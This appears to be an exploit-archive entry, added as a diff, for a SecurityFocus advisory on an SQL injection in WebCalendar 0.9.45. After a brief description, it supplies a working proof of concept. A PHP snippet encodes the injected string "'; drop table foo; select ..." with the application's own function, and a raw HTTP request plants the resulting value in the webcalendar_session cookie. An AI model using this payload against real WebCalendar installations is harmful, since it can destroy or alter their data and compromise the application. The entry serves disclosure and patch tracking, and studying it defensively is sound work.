@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/12581/info
+
+WebCalendar is affected by an SQL injection vulnerability. This issue exists because the application fails to properly sanitize user-supplied input before using it in SQL queries.
+
+Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.
+
+This vulnerability is reported to affect WebCalendar 0.9.45; earlier versions may also be affected.
+
+The vendor has addressed this issue in WebCalendar 1.0RC1 and later. 
+
+<?php
+include_once 'includes/init.php';
+echo encode_string("'; drop table foo; select 'a|zzabcdefg");
+?>
+
+output:
+7c8c3a738e858f4199b6b386743c7c8e906075c47f7b817993414cb6cd94897d7882858abbb8
+
+attack payload:
+telnet example.com
+GET /login.php HTTP/1.1
+Cookie: webcalendar_session=7c8c3a738e858f4199b6b386743c7c8e906075c47f7b817993414cb6cd94897d7882858abbb8 
